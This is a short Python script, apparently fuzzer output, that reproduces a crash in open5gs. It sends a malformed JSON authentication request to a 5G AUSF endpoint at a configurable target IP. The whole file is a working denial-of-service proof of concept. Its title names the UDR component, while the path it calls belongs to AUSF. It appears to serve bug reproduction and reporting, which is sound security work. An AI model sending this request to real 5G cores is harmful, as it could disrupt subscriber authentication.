#!/usr/bin/env python3
# Crash reproduction for open5gs-udr (low)
# Detected: Sat May  9 01:35:24 2026
import http.client, json

host, port = '127.0.0.1', 80  # Update to target IP
method = 'POST'
path = '/nausf-auth/v1/ue-authentications'
body = b'{"supiOrSuci": 99999, "servingNetworkName": -2147483648, "authType": 99999}'
conn = http.client.HTTPConnection(host, port, timeout=10)
headers = {'Content-Type': 'application/json'}
if body:
    conn.request(method, path, body=body, headers=headers)
else:
    conn.request(method, path, headers=headers)
resp = conn.getresponse()
print(f'Status: {resp.status}')
print(f'Body: {resp.read()[:500]}')
